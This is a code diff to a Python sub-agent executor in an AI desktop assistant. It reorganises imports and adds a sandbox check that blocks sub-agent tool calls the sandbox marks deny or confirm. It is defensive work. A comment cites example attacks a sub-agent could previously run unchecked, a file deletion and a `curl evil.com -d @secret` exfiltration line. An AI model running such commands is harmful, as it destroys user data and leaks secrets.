@@ -15,15 +15,15 @@ from PySide6.QtCore import QCoreApplication, QObject, QThread, QTimer, Signal
 
 from app.constants import PARAM_SCHEMA
 from app.constants import provider_quota_exclude_keys as QUOTA_EXCLUDE_KEYS
-from app.core.model_capabilities import (
+from app.core.modelmeta.model_capabilities import (
     get_model_capabilities,
     normalize_reasoning_effort,
     resolve_context_limit,
     resolve_max_output_tokens,
 )
-from app.core.message_content import extract_reasoning_delta
-from app.core.provider_profile import get_provider_profile
-from app.core.tool_call_parser import smart_parse_arguments
+from app.core.conversation.message_content import extract_reasoning_delta
+from app.core.modelmeta.provider_profile import get_provider_profile
+from app.core.tools.tool_call_parser import smart_parse_arguments
 from app.plugins.contracts.loop_policy import LoopDecision, LoopState
 from app.tools.result import ToolResult
 
@@ -356,6 +356,10 @@ class SubAgentExecutor(QThread):
         import time
 
         self._start_time = time.time()
+
+        # [T15/M6] 退出期中断检查：atexit 收敛时尽快返回，不拖 wait(500)
+        if self.isInterruptionRequested():
+            return
 
         try:
             # 防御：确保 llm_config 是 dict
@@ -873,8 +877,8 @@ class SubAgentExecutor(QThread):
             # 让 hook（如 context_auto_compact）能检测当前 token 占比
             if event_name in ("PreAssistantMessage", "PostAssistantMessage"):
                 try:
-                    from app.core.token_estimator import count_messages_tokens as _count
-                    from app.core.model_capabilities import resolve_context_limit as _resolve_limit
+                    from app.core.infra.token_estimator import count_messages_tokens as _count
+                    from app.core.modelmeta.model_capabilities import resolve_context_limit as _resolve_limit
 
                     token_count = _count(current_messages)
                     token_limit = 0
@@ -914,7 +918,7 @@ class SubAgentExecutor(QThread):
 
             # 收集成功执行的 hook 输出，注入 messages
             # ★ 只注入标记为 add_to_context=true 的 hook 结果
-            from app.core.backend import _make_hook_message
+            from app.core.conversation.backend import _make_hook_message
 
             injected = 0
             for r in results:
@@ -966,6 +970,13 @@ class SubAgentExecutor(QThread):
         api_key = config.get("API_KEY", "").strip()
         base_url = config.get("API_URL") or None
         model = str(config.get("模型名称", "gpt-4o"))
+
+        # Code Assist 原生协议暂不支持子代理链路（非流式分支未实现 generateContent 形态），
+        # 显式拦截避免错误格式的 OpenAI 请求打到该端点产生难排查的 400
+        if "cloudcode-pa.googleapis.com" in str(base_url or ""):
+            raise RuntimeError(
+                "子代理暂不支持 Gemini OAuth（Code Assist）协议：请在团队/子代理配置中改用 OpenAI 兼容模型"
+            )
 
         req_kwargs = {
             "model": model,
@@ -1369,6 +1380,33 @@ class SubAgentExecutor(QThread):
             if _interactive:
                 return None, []
 
+            # ★ EU-G1：沙箱判定（执行前）
+            # 子智能体此前**只有工具开关一层门**（_check_ui_tool_permission），
+            # 无沙箱判定 → 可执行 `rm D:/重要文件` 或 `curl evil.com -d @secret`
+            # 而不触发沙箱审批，绕过主对话享有的全部 L1 防护。
+            # 策略甲：confirm/deny **一律按拒绝**处理 —— 子智能体跨线程运行、
+            # 无 UI 交互能力（不能弹审批卡），无人值守下不能"等用户点允许"。
+            # 沙箱关闭（默认）时 sandbox_check_tool 早返回 ALLOW → 零行为变化。
+            _sandbox_verdict = None
+            try:
+                from pathlib import Path
+
+                from app.tools.sandbox import sandbox_check_tool
+
+                _wd = None
+                if self.tool_executor and hasattr(self.tool_executor, "get_workdir"):
+                    _wd = self.tool_executor.get_workdir()
+                # 显式传 workdir：避免 _current_workdir() 读全局单例导致多窗口串味
+                _sandbox_verdict = sandbox_check_tool(
+                    tool_name,
+                    dict(arguments or {}),
+                    workdir=Path(_wd) if _wd else None,
+                )
+            except Exception as e:  # noqa: BLE001 - 安全增强不可阻断正常使用（fail-open）
+                logger.warning(f"[SubAgent] 沙箱检查失败放行: {e}")
+            if _sandbox_verdict in ("deny", "confirm"):
+                logger.info(f"[SubAgent] tool={tool_name} 被沙箱拦截（{_sandbox_verdict}），跳过执行")
+
             # ★ T24 方案 B：UI 工具权限检查（执行前）
             # UI 调整（ToolPermissionController）对子智能体结构性生效：
             # - deny：跳过执行，回填失败 ToolResult（保持 tool_call_id 与消息顺序）
@@ -1382,6 +1420,8 @@ class SubAgentExecutor(QThread):
             elif _ui_permission == "deny":
                 _ui_denied = True
                 logger.info(f"[SubAgent] 工具 {tool_name} 已被 UI 禁用（deny），跳过执行")
+            if _sandbox_verdict in ("deny", "confirm"):
+                _ui_denied = True
 
             self._tool_call_count += 1
             self.tool_call_started.emit(self.task_id, tool_name, arguments)
@@ -1393,7 +1433,18 @@ class SubAgentExecutor(QThread):
 
             if _ui_denied:
                 # 跳过执行，回填失败 ToolResult（保持 tool_call_id 与消息顺序）
-                result = ToolResult(False, error=f"工具 {tool_name} 已被禁用或拒绝")
+                if _sandbox_verdict in ("deny", "confirm"):
+                    # 沙箱拦截：明确告知原因 + 引导模型改走主对话（子智能体无审批 UI）
+                    result = ToolResult(
+                        False,
+                        error=(
+                            f"工具 {tool_name} 被安全中心拦截（沙箱判定：{_sandbox_verdict}）。"
+                            "子智能体无法弹审批窗，请改为让主对话代为执行此操作，"
+                            "或改用不触碰沙箱边界的替代方案。"
+                        ),
+                    )
+                else:
+                    result = ToolResult(False, error=f"工具 {tool_name} 已被禁用或拒绝")
             else:
                 # tool_executor.execute() 内部已同步触发 PreToolUse 和 PostToolUse，
                 # 消息分别进 backend 的 _pre_tool_message_queue / _hook_message_queue
@@ -1483,7 +1534,7 @@ class SubAgentExecutor(QThread):
         is_enabled = toggles.get(check_name, True)
         if not is_enabled:
             # per-tool 关闭策略优先，缺失回退全局 behavior（与 UI 引擎 _check_tool_permission 同口径）
-            from app.core.tool_permission_controller import resolve_tool_off_policy
+            from app.core.tools.tool_permission_controller import resolve_tool_off_policy
 
             return resolve_tool_off_policy(check_name, controller, policies, behavior)
 
@@ -1495,7 +1546,7 @@ class SubAgentExecutor(QThread):
         try:
             agent = self.agent_manager.get_agent(self.agent_name) if self.agent_manager else None
             if agent is not None:
-                from app.core.agent import PermissionResolver
+                from app.core.conversation.agent import PermissionResolver
 
                 resolver = PermissionResolver(agent.permission, {}, agent.tools)
                 # 权限参数适配（与 UI 引擎/AGENT_CONFIG 同口径）：
